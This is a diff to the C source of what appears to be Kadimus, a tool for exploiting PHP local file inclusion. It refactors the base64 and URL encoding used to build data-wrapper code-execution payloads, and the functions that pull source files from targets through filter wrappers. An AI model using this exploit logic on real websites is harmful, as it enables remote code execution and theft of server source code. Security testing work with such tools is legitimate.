@@ -1,17 +1,23 @@
 #include "kadimus_xpl.h"
+#include "string/base64.h"
+#include "string/urlencode.h"
+
 
 char *build_datawrap(const char *phpcode){
-    char *ret, *b64;
+    char *ret, *b64, *url;
     size_t len;
+
     b64 = b64encode(phpcode, strlen(phpcode));
-    len = strlen(b64);
+    url = urlencode(b64);
+    free(b64);
+
+    len = strlen(url);
 
     ret = xmalloc(len + DATAWRAPLEN + 1);
     memcpy(ret, DATA_WRAP, DATAWRAPLEN);
-    memcpy(ret+DATAWRAPLEN, b64, len);
+    memcpy(ret+DATAWRAPLEN, url, len);
     ret[len+DATAWRAPLEN] = 0x0;
 
-    free(b64);
     return ret;
 }
 
@@ -400,8 +406,8 @@ int rce_scan(const char *base, struct parameter_list *plist, int p){
 
 void source_disclosure_get(const char *url, const char *filename, const char *pname, FILE *out){
     struct request body1, body2;
-    char *urlfilter, *filter, *content_diff;
-    struct dynptr b64;
+    char *urlfilter, *filter, *content_diff, *decoded;
+    size_t len;
 
     filter = xmalloc(strlen(filename)+sizeof(FILTER_WRAP));
     memcpy(filter, FILTER_WRAP, sizeof(FILTER_WRAP));
@@ -439,17 +445,17 @@ void source_disclosure_get(const char *url, const char *filename, const char *pn
 
     trim_string(&content_diff);
 
-    if(b64decode(content_diff, &b64)){
+    if((decoded = b64decode(content_diff, &len))){
         good_single("valid base64 returned:\n");
         if(out){
-            fwrite(b64.ptr, b64.len, 1, out);
+            fwrite(decoded, len, 1, out);
             fclose(out);
             info_single("check the output file\n");
         } else {
-            fwrite(b64.ptr, b64.len, 1, stdout);
+            fwrite(decoded, len, 1, stdout);
         }
         printf("\n");
-        free(b64.ptr);
+        free(decoded);
     } else {
         error_single("invalid base64 detected\n");
         info_single("try use null byte poison, or set filename without extension\n");
@@ -686,7 +692,8 @@ int common_error_check(const char *uri){
 
 int disclosure_check(const char *uri, const char *xuri){
     struct request body1, body2;
-    struct dynptr b64decoded;
+    char *decoded;
+    size_t len;
     char *b64 = NULL;
     int result = 0;
 
@@ -711,16 +718,16 @@ int disclosure_check(const char *uri, const char *xuri){
 
     trim_string(&b64);
 
-    if(b64decode(b64, &b64decoded)){
+    if((decoded = b64decode(b64, &len))){
         result = 1;
 
         if(!thread_on){
             good_all("target probably vulnerable, hexdump: \n\n");
-            hexdump(b64decoded.ptr, b64decoded.len);
+            hexdump(decoded, len);
             print_all("\n");
         }
 
-        free(b64decoded.ptr);
+        free(decoded);
     }
 
     free(b64);
